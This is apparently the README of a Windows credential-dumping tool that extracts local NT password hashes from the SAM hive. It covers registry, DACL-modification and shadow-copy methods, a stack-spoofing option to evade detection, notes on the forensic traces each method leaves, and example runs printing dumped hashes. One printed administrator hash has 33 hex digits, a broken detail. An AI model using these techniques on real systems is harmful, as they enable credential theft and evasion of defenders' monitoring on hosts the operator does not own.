This is a Windows SAM dumper

| Flag                      | What it does                                                 | Requires                                             | Failure / artifacts                                          |
| ------------------------- | ------------------------------------------------------------ | ---------------------------------------------------- | ------------------------------------------------------------ |
| `-h`, `--help`            | Prints usage and exits. Opens no keys, creates no snapshot.  | —                                                    | Exit code 0                                                  |
| `-r`, `--registry`        | Reads `SAM` / `SYSTEM` from the live registry.               | A `SYSTEM` token when used without `-dacl`           | Under an admin token `NtOpenKeyEx` returns `0xC0000022` (`STATUS_ACCESS_DENIED`) |
| `-dacl`, `--dacl-write`   | Appends an `Administrators: KEY_READ` ACE to the `SAM` / `SYSTEM` keys, then restores the original owner and DACL. | **Must be combined with `-r`**; no effect on its own | Two 4670 events (modify + restore) and `SeTakeOwnershipPrivilege` enablement. Restored on normal exit; not guaranteed if the process is killed |
| `-ss`, `--shadowSnapshot` | Creates a non-persistent shadow copy and parses the hive in place with offreg. No file is copied out. | Local administrator                                  | Shadow create/delete events and `vssapi.dll` load. **The snapshot is not deleted automatically** - run `vssadmin delete shadows` afterwards |
| `-d`, `--debug`           | Prints per-step `NTSTATUS`, syskey offsets, and the AES/DES branch decision. | —                                                    | Output only; behaviour unchanged                             |
| `-cc`, `--customCallback` | Routes NT calls through thread-pool callbacks (`TpAllocWork` / `TpPostWork`), so the stack is no longer `program!main -> ntdll!NtXxx`. | Stacks with `-r` / `-ss`                             | Adds a thread-pool registration step, which is a signature of its own |

Common combinations:

| Combination    | Prerequisite        | Use when                                                     |
| -------------- | ------------------- | ------------------------------------------------------------ |
| `-r`           | Already `SYSTEM`    | Fewest moving parts; the only artifact is a key handle       |
| `-r -dacl`     | Local administrator | You would rather touch the ACL once than create a snapshot   |
| `-ss`          | Local administrator | You will not modify the ACL and can accept shadow-copy artifacts |
| `-r -dacl -cc` | Local administrator | You also want to check whether stack spoofing holds on this host |



```shell
C:\>DaclSamHunter_win64.exe
Usage: DaclSamHunter_win64.exe [options]
Options:
  -h, --help  Show this help message
  -ss, --shadowSnapshot Use shadow snapshot method
  -r, --registry                Use registry method
  -dacl, --dacl-write   Modify SAM and SYSTEM registry keys DACL to read them without SYSTEM rights (use with -r)
  -d, --debug           Enable debug mode
  -cc, --customCallback Use custom callback mechanism (Stack Spoofing)


C:\>DaclSamHunter_win64.exe -ss
User [ Administrator ] with RID [ 500 ] -> NT: 32ED87BDB5FDC5E9CBA885471133818D4
User [ Guest ] with RID [ 501 ] -> NT: 31D6CFE0D16AE931B73C59D7E0C089C0
User [ DefaultAccount ] with RID [ 503 ] -> NT: F35B489303BD73B722FA4B8C8FB11408
User [ WDAGUtilityAccount ] with RID [ 504 ] -> NT: 97EAD4DB9C940416C1C17A8EDA53BBBE
User [ aaa ] with RID [ 1001 ] -> NT: ADFB9F39420833FD570FB5CF4E0AF223
User [ bbb ] with RID [ 1022 ] -> NT: A115F0F79B80721493B43DFD61816D56


C:\>DaclSamHunter_win64.exe -r -dacl
User [ Administrator ] with RID [ 500 ] -> NT: 32ED87BDB5FDC5E9CBA885471133818D4
User [ Guest ] with RID [ 501 ] -> NT: 31D6CFE0D16AE931B73C59D7E0C089C0
User [ DefaultAccount ] with RID [ 503 ] -> NT: F35B489303BD73B722FA4B8C8FB11408
User [ WDAGUtilityAccount ] with RID [ 504 ] -> NT: 97EAD4DB9C940416C1C17A8EDA53BBBE
User [ aaa ] with RID [ 1001 ] -> NT: ADFB9F39420833FD570FB5CF4E0AF223
User [ bbb ] with RID [ 1022 ] -> NT: A115F0F79B80721493B43DFD61816D56
```

